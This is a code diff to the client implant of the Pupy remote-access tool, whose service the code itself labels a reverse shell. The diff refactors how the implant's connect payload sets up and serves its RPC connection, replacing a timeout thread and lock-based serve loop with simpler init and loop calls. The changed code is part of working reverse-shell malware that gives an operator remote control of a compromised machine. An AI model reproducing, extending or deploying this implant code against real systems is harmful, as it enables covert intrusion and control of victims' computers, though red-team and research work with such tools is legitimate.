@@ -60,6 +60,7 @@ logger.setLevel(logging.WARNING)
 import time
 from rpyc.core.service import Service, ModuleNamespace
 from rpyc.lib.compat import execute
+from rpyc import async
 
 import threading
 import traceback
@@ -478,6 +479,11 @@ class ReverseSlaveService(Service):
     """ Pupy reverse shell rpyc service """
     __slots__ = ["exposed_namespace", "exposed_cleanups"]
 
+    def __init__(self, conn):
+        self.exposed_namespace = {}
+        self.exposed_cleanups = []
+        self._conn = conn
+
     def on_connect(self):
         self.exposed_namespace = {}
         self.exposed_cleanups = []
@@ -487,7 +493,9 @@ class ReverseSlaveService(Service):
         umsgpack.dump(self.exposed_get_infos(), infos)
 
         pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
-        self._conn.root.initialize_v1(
+        initialize_v1 = async(self._conn.root.initialize_v1)
+
+        initialize_v1(
             self.exposed_namespace,
             pupy.namespace,
             sys.modules['__builtin__'],
@@ -797,49 +805,14 @@ def rpyc_loop(launcher):
             else:  # connect payload
                 stream = ret
 
-                def check_timeout(event, cb, timeout=60):
-                    now = time.time()
+                conn = PupyConnection(
+                    None, ReverseSlaveService,
+                    PupyChannel(stream), config={},
+                    ping=stream.KEEP_ALIVE_REQUIRED
+                )
 
-                    while ( time.time() - now < timeout ) and not event.is_set():
-                        time.sleep(1)
-
-                    if not event.is_set():
-                        logger.error('timeout occured!')
-                        cb()
-
-                event = threading.Event()
-                t = threading.Thread(
-                    target=check_timeout, args=(
-                        event, stream.close))
-                t.daemon = True
-                t.start()
-
-                lock = threading.Lock()
-                conn = None
-
-                try:
-                    logger.debug('Starting pupy connection')
-                    conn = PupyConnection(
-                        lock, None, ReverseSlaveService,
-                        PupyChannel(stream), config={},
-                        ping=stream.KEEP_ALIVE_REQUIRED
-                    )
-                    logger.debug('Initialize connection')
-                    conn._init_service()
-                    logger.debug('Initialize complete')
-                finally:
-                    event.set()
-
-                attempt = 0
-
-                pupy.connected = True
-                logger.debug('Serve')
-                while not conn.closed:
-                    data = None
-                    with lock:
-                        data = conn.serve()
-
-                    conn.dispatch(data)
+                conn.init()
+                conn.loop()
 
         except SystemExit:
             raise
